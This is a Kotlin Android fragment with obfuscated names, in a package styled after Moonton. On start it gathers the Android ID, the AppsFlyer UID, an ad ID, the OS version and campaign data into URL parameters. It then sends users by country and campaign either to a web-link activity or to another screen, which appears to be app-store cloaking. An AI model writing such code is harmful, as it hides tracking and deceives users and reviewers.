package com.moonton.mob.asx


import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.moonton.mob.BuildConfig
import com.moonton.mob.R
import com.moonton.mob.sytwisjd.Nmmxkxkcuygds
import com.moonton.mob.sytwisjd.Daozkijsuhsd


class Ewowkoksijx : Fragment() {
    private lateinit var sadjisajijx: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        sadjisajijx = context
    }

    private fun jsushduhwhusd(fokcokxko: String) {
        OneSignal.setExternalUserId(
            fokcokxko,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(sodkdskoa: JSONObject) {

                    try {
                        if (sodkdskoa.has("push") && sodkdskoa.getJSONObject("push").has("success")) {
                            val cxnvnjnvjxcjidjis = sodkdskoa.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $cxnvnjnvjxcjidjis"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (sodkdskoa.has("email") && sodkdskoa.getJSONObject("email").has("success")) {
                            val roplpelplpslp =
                                sodkdskoa.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $roplpelplpslp"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (sodkdskoa.has("sms") && sodkdskoa.getJSONObject("sms").has("success")) {
                            val soospsldlpsplokxcko = sodkdskoa.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $soospsldlpsplokxcko"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {

                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    override fun onStart() {
        super.onStart()
        val epwl = "deviceID="
        val soksdko = shareP.getString("apps", null)
        val fokckoxko = "sub_id_4="
        val ijcgfjidjijidfjgji = "sub_id_6="
        val apapalsl = "sub_id_5="

        val rokwokok = Build.VERSION.RELEASE
        val xijzcij = "sub_id_1="
        val aokskokoaddaskox = "deeporg"
        val cxokvko = shareP.getString("country", null)
        val suidjwjiwdjijisahud = shareP.getString("appCamp", null)
        val epwlplp = shareP.getString("deepSt", null)
        val cxnvjjnvcjnxjnuhahsdu = shareP.getString("countryDev", null)

        val gokkokoeok = shareP.getString("wv", null)
        val soodsdplsd = "ad_id="
        val apalspalpkookxcjijixc = shareP.getString("mainId", null)
        val gysdsdidjw = "naming"
        val chuvhuxhuvxjjidji = BuildConfig.APPLICATION_ID

        val oxoczxcloloczxollzxck = MyTracker.getTrackerParams()
        oxoczxcloloczxollzxck.customUserId = apalspalpkookxcjijixc
        val ychvhu: String? = shareP.getString("instId", null)

        val gokdfko = AppsFlyerLib.getInstance().getAppsFlyerUID(sadjisajijx)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val sdijasji = Intent(sadjisajijx, Daozkijsuhsd::class.java)
        val sokxkokozokcokjisauhdfsu = Intent(sadjisajijx, Nmmxkxkcuygds::class.java)


        jsushduhwhusd(apalspalpkookxcjijixc.toString())

        val erpeppew = "$gokkokoeok$xijzcij$suidjwjiwdjijisahud&$epwl$gokdfko&$soodsdplsd$apalspalpkookxcjijixc&$fokckoxko$chuvhuxhuvxjjidji&$apapalsl$rokwokok&$ijcgfjidjijidfjgji$gysdsdidjw"
        val dpoxplzlslpd = "$gokkokoeok$epwl$apalspalpkookxcjijixc&$soodsdplsd$ychvhu&$fokckoxko$chuvhuxhuvxjjidji&$apapalsl$rokwokok&$ijcgfjidjijidfjgji$gysdsdidjw"
        val qplaplpsploxcijxzji = "$gokkokoeok$xijzcij$epwlplp&$epwl$gokdfko&$soodsdplsd$apalspalpkookxcjijixc&$fokckoxko$chuvhuxhuvxjjidji&$apapalsl$rokwokok&$ijcgfjidjijidfjgji$aokskokoaddaskox"
        val sijdsji = "$gokkokoeok$xijzcij$epwlplp&$epwl$apalspalpkookxcjijixc&$soodsdplsd$ychvhu&$fokckoxko$chuvhuxhuvxjjidji&$apapalsl$rokwokok&$ijcgfjidjijidfjgji$aokskokoaddaskox"

        when(soksdko) {
            "1" ->
                if(suidjwjiwdjijisahud != "null") {
                    shareP.edit().putString("link", erpeppew).apply()
                    startActivity(sdijasji)
                    activity?.finish()
                } else if (epwlplp!=null||cxnvjjnvcjnxjnuhahsdu!!.contains(cxokvko.toString())) {
                    shareP.edit().putString("link", qplaplpsploxcijxzji).apply()
                    startActivity(sdijasji)
                    activity?.finish()
                } else {
                    startActivity(sokxkokozokcokjisauhdfsu)
                    activity?.finish()
                }
            "0" ->
                if(epwlplp!=null) {
                    shareP.edit().putString("link", sijdsji).apply()
                    startActivity(sdijasji)
                    activity?.finish()
                } else if (cxnvjjnvcjnxjnuhahsdu!!.contains(cxokvko.toString())) {
                    shareP.edit().putString("link", dpoxplzlslpd).apply()
                    startActivity(sdijasji)
                    activity?.finish()
                } else {
                    startActivity(sokxkokozokcokjisauhdfsu)
                    activity?.finish()
                }
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.ccxyctftfds, container, false)
    }

    }